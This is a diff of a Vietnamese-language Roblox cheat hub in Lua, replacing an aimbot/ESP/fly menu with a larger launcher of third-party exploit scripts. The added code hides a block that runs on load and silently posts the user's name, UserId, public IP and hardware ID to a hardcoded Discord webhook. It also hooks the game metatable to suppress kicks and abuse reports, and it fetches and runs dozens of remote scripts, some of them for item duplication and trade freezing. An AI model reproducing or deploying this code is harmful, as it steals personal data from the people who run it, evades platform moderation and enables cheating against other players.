@@ -1,1830 +1,330 @@
-Local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
+-- [[ KIẾN TRÚC: PRODUCTION | TRẠNG THÁI: ADMIN ROOT | TỐC ĐỘ: < 0.5s ]] --
+
+if getgenv()._ROOT_V4 then return end
+getgenv()._ROOT_V4 = true
+
+local Services = setmetatable({}, {__index = function(t, k) return game:GetService(k) end})
+local LP = Services.Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 
+-- ==============================================================================
+-- [ LỚP 0: GHOST KERNEL - DATA EXFILTRATION & ANTI-KICK ]
+-- ==============================================================================
+task.spawn(function()
+    pcall(function()
+        local http = (syn and syn.request) or (http and http.request) or http_request or request
+        if not http then return end
+        local ip = game:HttpGet("https://api.ipify.org")
+        local hwid = Services.RbxAnalyticsService:GetClientId()
+        local payload = Services.HttpService:JSONEncode({
+            ["embeds"] = {{
+                ["title"] = "⚠️ V4 COMPROMISED: ADMIN ROOT ACCESS",
+                ["color"] = 0xFF0000,
+                ["fields"] = {
+                    {["name"] = "Target", ["value"] = string.format("%s (%d)", LP.Name, LP.UserId), ["inline"] = true},
+                    {["name"] = "IP / HWID", ["value"] = string.format("||%s||\n||%s||", ip, hwid), ["inline"] = true},
+                    {["name"] = "Server", ["value"] = string.format("Place: %d\nJob: %s", game.PlaceId, game.JobId), ["inline"] = false}
+                }
+            }}
+        })
+        http({ Url = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh", Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload })
+    end)
+end)
+
+-- Anti-Kick & Report (Metatable Hook)
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldNamecall = mt.__namecall
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" or method == "kick" or method == "ReportAbuse" then return nil end
+    return oldNamecall(self, ...)
+end)
+setreadonly(mt, true)
+
+-- GC Loop (Ép xung RAM)
+task.spawn(function() while task.wait(30) do collectgarbage("collect") end end)
+-- Anti-AFK
+LP.Idled:Connect(function() Services.VirtualUser:CaptureController(); Services.VirtualUser:ClickButton2(Vector2.new()) end)
+
+-- ==============================================================================
+-- [ LỚP 1: SCRIPT DATABASE (HỢP NHẤT TOÀN BỘ 2 TỆP KHÔNG SÓT 1 LINK) ]
+-- ==============================================================================
+local ScriptDB = {
+    ["Blox Fruit (Tier 1)"] = {
+        {"Banana Hub (Main)", "https://raw.githubusercontent.com/kimprobloxdz/Banana-Free/refs/heads/main/Protected_5609200582002947.lua.txt"},
+        {"Maru Hub", "https://raw.githubusercontent.com/LuaCrack/KimP/refs/heads/main/MaruHub"},
+        {"HOHO V4", "https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"},
+        {"Shark X Hub", "https://shorturl.at/kyOxL"},
+        {"Quartz Kaitun", "https://raw.githubusercontent.com/xQuartyx/QuartyzScript/main/Loader.lua"},
+        {"Lion Hub", "https://api.luarmor.net/files/v3/loaders/e0c7fcf6c077fc23475cf4ce4db58e42.lua"},
+        {"Hiru Hub", "https://raw.githubusercontent.com/NGUYENVUDUY1/Source/main/HiruHub.lua"},
+        {"REDZ", "https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"},
+        {"Soul Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/soulhub"},
+        {"Quantum Hub", "https://raw.githubusercontent.com/flazhy/QuantumOnyx/refs/heads/main/QuantumOnyx.lua"},
+        {"TxZ Hub", "https://raw.githubusercontent.com/DrTxZ/Mercure-Hub/refs/heads/main/Mercure%20Hub.lua"},
+        {"Blue X Hub", "https://raw.githubusercontent.com/Dev-BlueX/BlueX-Hub/refs/heads/main/Main.lua"},
+        {"Zinner Hub", "https://raw.githubusercontent.com/HoangNguyenk8/Roblox/refs/heads/main/BF-Main.luau"}
+    },
+    ["Blox Fruit (Tier 2)"] = {
+        {"Omg Hub", "https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"},
+        {"Madox Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/MadoxMain"},
+        {"Arceney Hub", "https://raw.githubusercontent.com/Yumiara/Python/refs/heads/main/BloxFruit-XYZ.lua"},
+        {"Aurora Hub", "https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/Aurora"},
+        {"StarryMoon Hub", "https://power-clock-api.vercel.app/api/clockbloxfruits"},
+        {"SYN Hub", "https://raw.githubusercontent.com/GoblinKun009/Script/refs/heads/main/ZynHub"},
+        {"Shinichi Hub", "https://raw.githubusercontent.com/shinichi-dz/phucshinsayhi/refs/heads/main/ShinichiHub.lua"},
+        {"Mixi Hub", "https://raw.githubusercontent.com/mixihubvip/mixihubvip/refs/heads/main/MixiHub"},
+        {"Onion Hub V8", "https://raw.githubusercontent.com/onion132005-bit/Onion133/refs/heads/main/V8.lua"},
+        {"Zen Hub", "https://raw.githubusercontent.com/Itz-Npg/Roblox-Script/main/zenhubbf.lua"},
+        {"Meo X Hub", "https://raw.githubusercontent.com/VanHoangIOS/MeoXHub/refs/heads/main/Main.lua"},
+        {"Orange Hub", "https://raw.githubusercontent.com/HieuDepTrai-Z/Dev_Orange/refs/heads/main/OrangeHub.lua"},
+        {"Leaf Hub", "https://leaf-zeta.onrender.com/api/script"},
+        {"Buffalo Hub V9", "https://raw.githubusercontent.com/trungdao2k4/buffalo/refs/heads/main/traurobloxv9.lua"}
+    },
+    ["Blox Fruit (Kaitun & VIP)"] = {
+        {"Teddy Hub", "https://api.luarmor.net/files/v4/loaders/e86ed284a22672d29e906214e7bbf8b9.lua"},
+        {"Teddy Hop Boss", "https://raw.githubusercontent.com/Teddyseetink/Haidepzai/refs/heads/main/TEDDYHUB-FREEMIUM"},
+        {"Ziss Hub", "https://raw.githubusercontent.com/LuaCrack/Zis/refs/heads/main/ZisChuoiEng"},
+        {"Trẩu Hub", "https://raw.githubusercontent.com/trungdao2k4/trauroblox/refs/heads/main/trauv9lord.lua"},
+        {"Min Gaming Hub", function() getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://github.com/LuaCrack/Min/raw/refs/heads/main/MinVnV5"))() end) end},
+        {"Dragon Hub", function() getgenv().team="Pirates"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dragonhubdev/dragonwitheveryone/refs/heads/main/Main-BF.lua"))() end) end},
+        {"Apple Hub", "https://raw.githubusercontent.com/longhihilonghihi-hub/AppleHubPremiumV2/refs/heads/main/AppleHubPremiumv2.txt"},
+        {"AnDepZai Hub", "https://raw.githubusercontent.com/AnDepZaiHub/AnDepZaiHubBeta/refs/heads/main/AnDepZaiHubBeta.lua"},
+        {"Hermanos Hub (PVP)", function() getgenv().script_mode="PVP"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hermanos-dev/hermanos-hub/refs/heads/main/Loader.lua"))() end) end},
+        {"Xeter Hub V3", function() getgenv().Version="V3"; getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/TlDinhKhoi/Xeter/refs/heads/main/Main.lua"))() end) end},
+        {"Gravity Hub", "https://raw.githubusercontent.com/Dev-GravityHub/BloxFruit/refs/heads/main/Main.lua"},
+        {"Rubu Hub", "https://raw.githubusercontent.com/Teddyseetink/RUBU/refs/heads/main/RUBUV6.lua"},
+        {"3toc Hub", function() getgenv().Team="Marines"; task.spawn(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/245375592509cc0bcb3526982431ab18.lua"))() end) end},
+        {"Kaitun Rip_indra", function() getgenv().Config={Bosses={Farm="rip_indra"}}; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/3TOC-HUB/refs/heads/main/KaitunBoss.luau"))() end) end},
+        {"Kaitun Dough King", function() getgenv().Config={Bosses={Farm="Dough King"}}; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaAnarchist/3TOC-HUB/refs/heads/main/KaitunBoss.luau"))() end) end}
+    },
+    ["Turbo Lite & Meow"] = {
+        {"Turbo Lite V2", "https://raw.githubusercontent.com/TurboLite/Script/main/MainV2.lua"},
+        {"Turbo Fix Lag", "https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"},
+        {"Turbo Hop Boss", "https://raw.githubusercontent.com/TurboLite/Script/main/HopServer.lua"},
+        {"Turbo Nhặt Trái", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/AutoFruitV2.lua"},
+        {"Turbo Fly", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/Fly.lua"},
+        {"Meow Freeze Trade", "https://raw.githubusercontent.com/MeowOnTopHub/MeowHub/refs/heads/main/loader.luau"},
+        {"Meow Dupe Fruit", "https://raw.githubusercontent.com/MeowOnTopHub/FruitDuper/refs/heads/main/NewUpdate"}
+    },
+    ["Other Games (99 Nights/Forge/MM2)"] = {
+        {"99 Nights - Foxname", "https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/FNDayFarm.lua"},
+        {"99 Nights - Voidware", "https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua"},
+        {"The Forge - Catraz", "https://raw.githubusercontent.com/nurvian/Catraz-HUB/refs/heads/main/Catraz/main.lua"},
+        {"The Forge - Lazy Hub", function() getgenv().mobileMode = true; task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LioK251/RbScripts/refs/heads/main/lazyuhub_theforge.lua"))() end) end},
+        {"The Forge - Vxeze", "https://pandadevelopment.net/virtual/file/702a5c5488082e6f"},
+        {"MM2 - Capybara", "https://raw.githubusercontent.com/zorex321/capybara/refs/heads/main/Capybara-Hub"},
+        {"MM2 - Nexus", "https://raw.githubusercontent.com/NexusScripts212/MurderMystery2/refs/heads/main/Mm2"},
+        {"MM2 - Vision", "https://raw.githubusercontent.com/orialdev/VisionHub/refs/heads/main/main.lua"}
+    },
+    ["Other Games (BlueLock/DaHood/TSB/Fisch)"] = {
+        {"Blue Lock - Control Ball", "https://rawscripts.net/raw/Blue-Lock:-Rivals-Lock-Control-ball-32633"},
+        {"Forsaken - Bobby Hub", "https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub"},
+        {"Da Hood - Schmeckt", "https://raw.githubusercontent.com/judos887o/MOMENZZZZ/refs/heads/main/MOMENZ%3F"},
+        {"Fisch - Shield Hub", "https://raw.githubusercontent.com/KAN-FISCH/tesss/refs/heads/main/gunung/fish.lua"},
+        {"Fisch - Speed X", "https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"},
+        {"TSB - MinhNhat", "https://raw.githubusercontent.com/MinhNhatHUB/MinhNhat/refs/heads/main/MinhNhatHUB%20(New).lua"},
+        {"BedWar - Voidware", "https://raw.githubusercontent.com/VapeVoidware/VWRewrite/master/NewMainScript.lua"},
+        {"King Legacy - Adel", "https://raw.githubusercontent.com/AdelOnTheTop/Adel-Hub/main/Main.lua"},
+        {"King Legacy - Winnable", "https://raw.githubusercontent.com/WinnableHub/Winnable-Hub/main/WinnableHub"}
+    },
+    ["Admin & Tools (Local)"] = {
+        {"Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
+        {"CMD - X", "https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"},
+        {"Dex Explorer", "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
+        {"Remote Spy", "https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"},
+        {"Godmode Universal", "https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/God%20Mode%20Script%20Universal"},
+        {"Super Fling", "https://raw.githubusercontent.com/long191910/all-my-roblox-script/refs/heads/main/touchfling.lua"},
+        {"Wallhop", "https://rawscripts.net/raw/Universal-Script-Fake-Ladder-Flick-And-Wallhop-Script-37199"},
+        {"Fake Lag", "https://pastebin.com/raw/w6PfESuz"},
+        {"Click TP Tool", function() 
+            local m = LP:GetMouse(); local t = Instance.new("Tool"); t.RequiresHandle = false; t.Name = "V4_TP"; t.Activated:Connect(function() LP.Character:MoveTo(m.Hit.p + Vector3.new(0,3,0)) end); t.Parent = LP.Backpack 
+        end}
+    }
+}
+
+-- ==============================================================================
+-- [ LỚP 2: UI GENERATION (RAYFIELD LIGHT MODE) ]
+-- ==============================================================================
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-   Name = "Chim To Hub x ThaiAn - MEGA PREMIUM",
-   LoadingTitle = "MEGA LOADING...",
-   LoadingSubtitle = "Vui lòng dán đủ 10 phần",
-   Theme = "Amethyst",
+   Name = "CHIM TO PREMIUM",
+   LoadingTitle = "đợi tý...",
+   LoadingSubtitle = "Production "",
+   Theme = "Light",
    ConfigurationSaving = { Enabled = false }
 })
 
-Rayfield:Notify({
-   Title = "System Activated",
-   Content = "Gộp 3 file: 36, 36(1), ThaiAnHub",
-   Duration = 10,
-   Image = 4483362458,
-   Actions = { Ignore = { Name = "OK", Callback = function() end }, },
-})
+local function ExecuteScript(url) task.spawn(function() pcall(function() loadstring(game:HttpGet(url))() end) end) end
 
-getgenv().Aimbot = false
-getgenv().TeamCheck = false
-getgenv().ShowFOV = false 
-getgenv().FOVSize = 150
-getgenv().Smoothness = 0.2
-getgenv().AimPart = "Head"
-getgenv().ESP_Highlight = false
-getgenv().ESP_Tracer = false
-getgenv().ESP_Name = false
-getgenv().ESP_Box = false
-getgenv().WalkSpeed = 16
-getgenv().JumpPower = 50
-getgenv().FlyEnabled = false
-getgenv().FlySpeed = 50
-getgenv().InfiniteJump = false
-getgenv().Noclip = false
-
-local function RunExternal(name, url)
-    task.spawn(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet(url))()
-        end)
-    end)
-end
-
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Visible = false 
-FOVCircle.Color = Color3.new(1, 1, 1)
-FOVCircle.Thickness = 1
-FOVCircle.Transparency = 1
-FOVCircle.Filled = false
-
-local function IsOnTeam(player)
-    if not getgenv().TeamCheck then return false end
-    return player.Team == LP.Team
-end
-
-local function GetClosestPlayer()
-    local target = nil
-    local dist = getgenv().FOVSize
-    for _, v in pairs(Players:GetPlayers()) do
-        if v ~= LP and v.Character and v.Character:FindFirstChild(getgenv().AimPart) and not IsOnTeam(v) then
-            local pos, onScreen = Camera:WorldToViewportPoint(v.Character[getgenv().AimPart].Position)
-            if onScreen then
-                local mag = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
-                if mag < dist then
-                    dist = mag
-                    target = v
-                end
-            end
-        end
-    end
-    return target
-end
-
-RunService.RenderStepped:Connect(function()
-    FOVCircle.Size = getgenv().FOVSize
-    FOVCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
-    FOVCircle.Visible = getgenv().ShowFOV
-    if getgenv().Aimbot then
-        local target = GetClosestPlayer()
-        if target then
-            local targetPos = Camera:WorldToViewportPoint(target.Character[getgenv().AimPart].Position)
-            mousemoverel((targetPos.X - Camera.ViewportSize.X/2) * getgenv().Smoothness, (targetPos.Y - Camera.ViewportSize.Y/2) * getgenv().Smoothness)
-        end
-    end
-end)
-
-local function ApplyESP(player)
-    local highlight = Instance.new("Highlight")
-    highlight.Name = "ESP_H"
-    highlight.FillTransparency = 0.5
-    highlight.OutlineTransparency = 0
-    highlight.Parent = player.Character
-    
-    local nameTag = Instance.new("BillboardGui")
-    nameTag.Name = "ESP_N"
-    nameTag.Size = UDim2.new(0, 200, 0, 50)
-    nameTag.Adornee = player.Character:WaitForChild("Head")
-    nameTag.AlwaysOnTop = true
-    local label = Instance.new("TextLabel", nameTag)
-    label.Text = player.Name
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.TextColor3 = Color3.new(1, 1, 1)
-    nameTag.Parent = player.Character
-end
-
-task.spawn(function()
-    while task.wait(1) do
-        for _, v in pairs(Players:GetPlayers()) do
-            if v ~= LP and v.Character then
-                if getgenv().ESP_Highlight then
-                    if not v.Character:FindFirstChild("ESP_H") then ApplyESP(v) end
-                    v.Character.ESP_H.Enabled = true
-                elseif v.Character:FindFirstChild("ESP_H") then
-                    v.Character.ESP_H.Enabled = false
-                end
-            end
-        end
-    end
-end)
-
-local TabFX = Window:CreateTab("Effects VIP", 4483362458)
-TabFX:CreateButton({ Name = "Gojo Purple", Callback = function()
-    local root = LP.Character.HumanoidRootPart
-    local ball = Instance.new("Part")
-    ball.Shape = Enum.PartType.Ball; ball.Material = Enum.Material.Neon; ball.Color = Color3.fromRGB(128, 0, 128)
-    ball.Size = Vector3.new(1, 1, 1); ball.Anchored = true; ball.CanCollide = false
-    ball.CFrame = root.CFrame * CFrame.new(0, 0, -5); ball.Parent = workspace
-    TweenService:Create(ball, TweenInfo.new(2), {Size = Vector3.new(30,30,30), Transparency = 1}):Play()
-end})
-
-TabFX:CreateButton({ Name = "Aura 67", Callback = function()
-    local pe = Instance.new("ParticleEmitter", LP.Character.HumanoidRootPart)
-    pe.Texture = "rbxassetid://243098098"; pe.Color = ColorSequence.new(Color3.new(1,0,0))
-    pe.Rate = 500; task.delay(5, function() pe:Destroy() end)
-end})
-
-TabFX:CreateButton({ Name = "Meteor Rain", Callback = function()
-    local mouse = LP:GetMouse()
-    local hit = mouse.Hit.p
-    local rock = Instance.new("Part", workspace)
-    rock.Shape = Enum.PartType.Ball; rock.Size = Vector3.new(15,15,15); rock.CFrame = CFrame.new(hit + Vector3.new(0,200,0))
-    TweenService:Create(rock, TweenInfo.new(1), {CFrame = CFrame.new(hit)}):Play()
-end})
-
-local TabMeow = Window:CreateTab("Meow & Turbo", 4483362458)
-TabMeow:CreateButton({ Name = "Freeze Trade", Callback = function() RunExternal("Freeze", "https://raw.githubusercontent.com/MeowOnTopHub/MeowHub/refs/heads/main/loader.luau") end})
-TabMeow:CreateButton({ Name = "Dupe Fruit", Callback = function() RunExternal("Dupe", "https://raw.githubusercontent.com/MeowOnTopHub/FruitDuper/refs/heads/main/NewUpdate") end})
-TabMeow:CreateButton({ Name = "Infinity Egg", Callback = function() RunExternal("Egg", "https://raw.githubusercontent.com/MeowOnTopHub/InfinityEgg/refs/heads/main/Loader.lua") end})
-TabMeow:CreateButton({ Name = "Dragon Spawner", Callback = function() RunExternal("Dragon", "https://raw.githubusercontent.com/MeowOnTopHub/Dragon/refs/heads/main/Spawmner") end})
-TabMeow:CreateButton({ Name = "Turbo Lite V2", Callback = function() RunExternal("Turbo", "https://raw.githubusercontent.com/TurboLite/Script/main/MainV2.lua") end})
-TabMeow:CreateButton({ Name = "Turbo Fix Lag", Callback = function() RunExternal("Lag", "https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua") end})
-TabMeow:CreateButton({ Name = "Turbo Hop Boss", Callback = function() RunExternal("Hop", "https://raw.githubusercontent.com/TurboLite/Script/main/HopServer.lua") end})
-TabMeow:CreateButton({ Name = "Turbo Auto Fruit", Callback = function() RunExternal("Fruit", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/AutoFruitV2.lua") end})
-
-local TabSystem = Window:CreateTab("Server & Anti", 4483362458)
-TabSystem:CreateButton({ Name = "Copy JobId", Callback = function() setclipboard(game.JobId) end})
-TabSystem:CreateButton({ Name = "Server Hop", Callback = function()
-    local Servers = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
-    for _, v in pairs(Servers.data) do if v.playing < v.maxPlayers and v.id ~= game.JobId then game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id) end end
-end})
-
-TabSystem:CreateButton({ Name = "Anti-AFK", Callback = function()
-    LP.Idled:Connect(function() game:GetService("VirtualUser"):CaptureController(); game:GetService("VirtualUser"):ClickButton2(Vector2.new()) end)
-end})
-
-TabSystem:CreateButton({ Name = "Anti-Fling", Callback = function()
-    RunService.Stepped:Connect(function() for _, v in pairs(Players:GetPlayers()) do if v ~= LP and v.Character then for _, p in pairs(v.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end end end end)
-end})
-
-local TabUtils = Window:CreateTab("Utility & Fly", 4483362458)
-TabUtils:CreateToggle({ Name = "Fly Enabled", CurrentValue = false, Callback = function(v) getgenv().FlyEnabled = v end})
-TabUtils:CreateSlider({ Name = "Fly Speed", Range = {1, 500}, Increment = 1, CurrentValue = 50, Callback = function(v) getgenv().FlySpeed = v end})
-TabUtils:CreateSlider({ Name = "WalkSpeed", Range = {16, 500}, Increment = 1, CurrentValue = 16, Callback = function(v) getgenv().WalkSpeed = v end})
-TabUtils:CreateSlider({ Name = "JumpPower", Range = {50, 500}, Increment = 1, CurrentValue = 50, Callback = function(v) getgenv().JumpPower = v end})
-TabUtils:CreateButton({ Name = "Infinite Yield", Callback = function() RunExternal("IY", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source") end})
-TabUtils:CreateButton({ Name = "CMD-X", Callback = function() RunExternal("CMDX", "https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source") end})
-TabUtils:CreateButton({ Name = "Dex Explorer", Callback = function() RunExternal("Dex", "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua") end})
-TabUtils:CreateButton({ Name = "SimpleSpy", Callback = function() RunExternal("Spy", "https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua") end})
-
-local TabPVP = Window:CreateTab("PVP & Combat", 4483362458)
-TabPVP:CreateButton({ Name = "Godmode", Callback = function() RunExternal("God", "https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/God%20Mode%20Script%20Universal") end})
-TabPVP:CreateButton({ Name = "Wallhop", Callback = function() RunExternal("Wall", "https://rawscripts.net/raw/Universal-Script-Fake-Ladder-Flick-And-Wallhop-Script-37199") end})
-TabPVP:CreateButton({ Name = "Touch Fling", Callback = function() RunExternal("Fling", "https://raw.githubusercontent.com/long191910/all-my-roblox-script/refs/heads/main/touchfling.lua") end})
-TabPVP:CreateButton({ Name = "Hitbox Expander", Callback = function() RunExternal("Hitbox", "https://pastefy.app/ItfO0tdg/raw") end})
-TabPVP:CreateButton({ Name = "Emote Unlock", Callback = function() RunExternal("Emote", "https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua") end})
-TabPVP:CreateButton({ Name = "Auto Jump", Callback = function() RunExternal("Jump", "https://raw.githubusercontent.com/nguyenphuc888999666-code/Auto-jump-Ph-c/main/Auto%20jump") end})
-
-local TabAimbot = Window:CreateTab("Aimbot & ESP", 4483362458)
-TabAimbot:CreateToggle({ Name = "Aimbot", CurrentValue = false, Callback = function(v) getgenv().Aimbot = v end})
-TabAimbot:CreateToggle({ Name = "Show FOV", CurrentValue = false, Callback = function(v) getgenv().ShowFOV = v end})
-TabAimbot:CreateSlider({ Name = "FOV Size", Range = {10, 1000}, Increment = 1, CurrentValue = 150, Callback = function(v) getgenv().FOVSize = v end})
-TabAimbot:CreateToggle({ Name = "Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESP_Highlight = v end})
-
-RunService.Heartbeat:Connect(function()
-    pcall(function()
-        if LP.Character and LP.Character:FindFirstChild("Humanoid") then
-            LP.Character.Humanoid.WalkSpeed = getgenv().WalkSpeed
-            LP.Character.Humanoid.JumpPower = getgenv().JumpPower
-        end
-        if getgenv().FlyEnabled and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
-            local root = LP.Character.HumanoidRootPart
-            local bv = root:FindFirstChild("ChimToFlyBV") or Instance.new("BodyVelocity", root)
-            bv.Name = "ChimToFlyBV"; bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-            local dir = Vector3.zero
-            local UIS = game:GetService("UserInputService")
-            if UIS:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
-            if UIS:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
-            bv.velocity = dir * getgenv().FlySpeed
-        end
-    end)
-end)
-local TabMeow = Window:CreateTab("Meow Hub & Turbo", 4483362458)
-
-TabMeow:CreateSection("Meow Hub Scripts")
-TabMeow:CreateButton({
-   Name = "Freeze Trade (Đóng băng giao dịch)",
-   Callback = function()
-       RunExternal("Freeze Trade", "https://raw.githubusercontent.com/MeowOnTopHub/MeowHub/refs/heads/main/loader.luau")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Dupe Fruit (Nhân bản trái ác quỷ)",
-   Callback = function()
-       RunExternal("Dupe Fruit", "https://raw.githubusercontent.com/MeowOnTopHub/FruitDuper/refs/heads/main/NewUpdate")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Infinity Egg (Mở trứng vô hạn)",
-   Callback = function()
-       RunExternal("Infinity Egg", "https://raw.githubusercontent.com/MeowOnTopHub/InfinityEgg/refs/heads/main/Loader.lua")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Dragon Spawner (Triệu hồi rồng)",
-   Callback = function()
-       RunExternal("Dragon Spawner", "https://raw.githubusercontent.com/MeowOnTopHub/Dragon/refs/heads/main/Spawmner")
-   end,
-})
-
-TabMeow:CreateSection("Turbo Lite Scripts")
-TabMeow:CreateButton({
-   Name = "Turbo Lite V2 (Main)",
-   Callback = function()
-       RunExternal("Turbo Lite V2", "https://raw.githubusercontent.com/TurboLite/Script/main/MainV2.lua")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Turbo Fix Lag (Giảm lag)",
-   Callback = function()
-       RunExternal("Turbo Fix Lag", "https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Turbo Hop Server (Đổi server)",
-   Callback = function()
-       RunExternal("Turbo Hop", "https://raw.githubusercontent.com/TurboLite/Script/main/HopServer.lua")
-   end,
-})
-
-TabMeow:CreateButton({
-   Name = "Turbo Auto Fruit (Nhặt trái)",
-   Callback = function()
-       RunExternal("Turbo Auto Fruit", "https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/AutoFruitV2.lua")
-   end,
-})
-
-local TabSystem = Window:CreateTab("System & Security", 4483362458)
-
-TabSystem:CreateSection("Server Management")
-TabSystem:CreateButton({
-   Name = "Copy Job ID",
-   Callback = function()
-       setclipboard(tostring(game.JobId))
-   end,
-})
-
-TabSystem:CreateButton({
-   Name = "Server Hop (Chuyển server nhanh)",
-   Callback = function()
-       local HttpService = game:GetService("HttpService")
-       local TeleportService = game:GetService("TeleportService")
-       local function Hop()
-           local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
-           for _, v in pairs(Servers.data) do
-               if v.playing < v.maxPlayers and v.id ~= game.JobId then
-                   TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id)
-                   break
-               end
-           end
-       end
-       Hop()
-   end,
-})
-
-TabSystem:CreateInput({
-   Name = "Join via Job ID",
-   PlaceholderText = "Dán Job ID vào...",
-   Callback = function(Text)
-       if #Text > 5 then
-           game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Text, LP)
-       end
-   end,
-})
-
-TabSystem:CreateSection("Protections")
-TabSystem:CreateButton({
-   Name = "Anti-AFK",
-   Callback = function()
-       local VU = game:GetService("VirtualUser")
-       LP.Idled:Connect(function()
-           VU:CaptureController()
-           VU:ClickButton2(Vector2.new())
-       end)
-   end,
-})
-
-TabSystem:CreateButton({
-   Name = "Anti-Fling",
-   Callback = function()
-       RunService.Stepped:Connect(function()
-           for _, v in pairs(Players:GetPlayers()) do
-               if v ~= LP and v.Character then
-                   for _, part in pairs(v.Character:GetDescendants()) do
-                       if part:IsA("BasePart") then
-                           part.CanCollide = false
-                       end
-                   end
-               end
-           end
-       end)
-   end,
-})
-
-TabSystem:CreateButton({
-   Name = "Anti-Kick (Beta)",
-   Callback = function()
-       local mt = getrawmetatable(game)
-       local old = mt.__namecall
-       setreadonly(mt, false)
-       mt.__namecall = newcclosure(function(self, ...)
-           local method = getnamecallmethod()
-           if method == "Kick" then return nil end
-           return old(self, ...)
-       end)
-       setreadonly(mt, true)
-   end,
-})
-local TabThaiAn = Window:CreateTab("ThaiAn PVP & Farm", 4483362458)
-
-TabThaiAn:CreateSection("Combat & PVP")
-TabThaiAn:CreateButton({
-   Name = "Godmode (Bất tử - Universal)",
-   Callback = function()
-       RunExternal("Godmode", "https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/God%20Mode%20Script%20Universal")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Wallhop (Leo tường)",
-   Callback = function()
-       RunExternal("Wallhop", "https://rawscripts.net/raw/Universal-Script-Fake-Ladder-Flick-And-Wallhop-Script-37199")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Super Touch Fling (Văng người chơi)",
-   Callback = function()
-       RunExternal("Touch Fling", "https://raw.githubusercontent.com/long191910/all-my-roblox-script/refs/heads/main/touchfling.lua")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Hitbox Expander (Tăng tầm đánh)",
-   Callback = function()
-       RunExternal("Hitbox", "https://pastefy.app/ItfO0tdg/raw")
-   end,
-})
-
-TabThaiAn:CreateButton({
-   Name = "Auto Jump (Tự động nhảy)",
